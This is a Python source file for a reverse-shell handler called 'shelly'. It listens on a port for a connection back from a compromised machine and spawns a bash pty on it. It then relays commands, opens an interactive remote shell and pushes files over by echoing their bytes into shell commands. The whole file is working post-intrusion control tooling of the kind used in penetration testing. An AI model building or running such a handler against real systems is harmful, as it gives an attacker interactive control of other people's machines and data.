import socket
import subprocess
import readline
 
helpBanner = '''shelly> <command> [options] 

commands:
  help, ?
  ls
  cd
  pwd
  shell
  upload
'''
 
class Netcat:
	def __init__(self, target='0.0.0.0', port=1234):
		self.port = port
		self.target = target
		self.ans = ''
		self.command = None
		self.waiting = False
		self.RecvTimeout = 0.10
 
 
		self.commands = {
			'ls': lambda args: self.exec('ls ' + args),
			'cd': lambda args: self.exec('cd ' + args),
			'pwd': lambda args: self.exec('pwd ' + args),
			'id': lambda args: self.exec('id ' + args),
			'shell': lambda args: self.shell(),
			'upload': lambda args: self.upload(args),
			'help': lambda args: self.help()
		}
 
		self.history_index = 0
		self.history_files = [".main_history", ".shell_history"]
		self.max_history_length = 100
 
		self.load_history(self.history_files[self.history_index])
 
 
	def load_history(self, file):
		try:
			readline.read_history_file(file)
		except FileNotFoundError:
			print("[-] Warning: Loading history file filed!")
 
	def save_history(self, file):
		readline.write_history_file(file)
 
	def switch_history(self):
		readline.clear_history()
		self.history_index = not self.history_index
		self.load_history(self.history_files[self.history_index])
 
 
	def Recv(self):
		self.ans = ''
		try:
			while True:
				data = self.client_socket.recv(1024).decode()
				if not data:
					break
				self.ans += data
		except:
			pass
 
		return self.ans

	def Send(self, command):
		self.command = command
		self.command += b"\n"
		self.client_socket.sendall(self.command)
 
 
	def listen(self):
		try:
			server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
			server.bind((self.target, self.port))
			server.listen(5) # no need for multiple connections at the same time for now !! 
 
			print("Listening on port " + str(self.port))
			self.client_socket, address = server.accept()
			print('Connection received from ', self.target)
			self.client_socket.settimeout(self.RecvTimeout)
 
		except KeyboardInterrupt:
			print("\b\bBye ^^")
			exit(0)
 
 
 
	def MyInput(self):
		pass
 
	def help(self):
		print(helpBanner)
 
 
	def clear(self):
		subprocess.run(['clear'], shell=True)
 
 
	def shell(self):
		self.switch_history()
		self.Send(b'')
 
		while True:
			try:
				i = input('\n'.join(self.Recv().split('\n')[1:]))
				if (not i): 
					# print("")
					self.Send(b'')
					continue
 
				if i.strip() == 'back': 
					self.switch_history()
					break
 
				with open(self.history_files[self.history_index], 'a') as f:
					f.write(i + '\n')
 
				self.Send(i.encode())
			except KeyboardInterrupt:
				self.Send(b'\x03')
			except EOFError:
				self.Send(b'\x04')
				# print("\n[*] Going back to shelly ")
 
 
 
	def upload(self, filepath):
		with open(filepath, 'rb') as file: # check if file exists
			data = file.read()
			size = len(data)
			filename = filepath.rstrip("/").split('/')[-1]
 
			print(f'[+] uploading the content of the file {filename} on the path {filepath}')
 
			self.Send(b"echo -n '" + data + b"' > " + filename.encode()) # we need a better way !! 
 
	def exec(self, command):
		self.Send(command.encode())
		R = '\n'.join(self.Recv().split('\n')[1:-1])
		if R:
			print(R, end='\n')
		else:
			print(R, end='')
 
	def interact(self):
		self.Recv()
		self.exec("python3 -c 'import pty; pty.spawn(\"/bin/bash\")';")
		self.exec("export SHELL=bash; export TERM=xterm; export LS_OPTIONS='--color=auto'; eval \"`dircolors`\"; alias ls='ls $LS_OPTIONS'")
		self.exec("magenta=$(tput setaf 5); blue=$(tput setaf 4); reset=$(tput sgr0)")
		self.exec("export PS1='[\\[$magenta\\]\\u\\[$reset\\]@\\[$magenta\\]\\h\\[$reset\\]:\\[$blue\\]\\w\\[$reset\\]]\\$ '")
		self.Recv()
 
		
		while True:
			try:
				i = input(f"shelly-[{self.target}:{self.port}]> ")
				cmd = i.split()
 
				if not cmd:
					continue
 
				command = cmd[0]
				args = " ".join(cmd[1:])
 
				with open(self.history_files[self.history_index], 'a') as f:
					f.write(i + '\n')

				if command in self.commands:
					self.commands[command](args)
				else:
					print(f"[-] Unknown command! : {command}")
 
			except KeyboardInterrupt:
				try:    
					i = input("\n[*] Are you sure [Y/n] ? ")
					if i.rstrip() == "Y":
						self.client_socket.close()
						print("Bye ^^")
						break
				except KeyboardInterrupt:
					break
 
 